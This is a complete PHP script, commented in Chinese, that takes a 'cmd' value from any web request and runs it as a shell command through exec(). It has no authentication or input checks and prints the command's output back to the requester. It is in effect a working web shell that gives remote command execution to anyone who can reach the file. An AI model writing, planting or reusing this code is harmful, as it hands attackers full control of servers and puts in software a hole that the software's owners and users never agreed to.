<?php


$cmd = trim($_REQUEST['cmd']);
if ($cmd == '') {
    die('命令为空.');
}

$output = array();
$returnValue = 0;

// 执行 shell 命令
exec($cmd, $output, $returnValue);

// 检查返回值以确定命令是否成功执行
if ($returnValue === 0) {
    // 输出正确的结果
    echo nl2br("Command executed successfully.\n\nOutput:\n".implode("\n", $output));
} else {
    // 输出错误信息
    echo nl2br("Command failed to execute.\n\nError:\n".implode("\n", $output));
}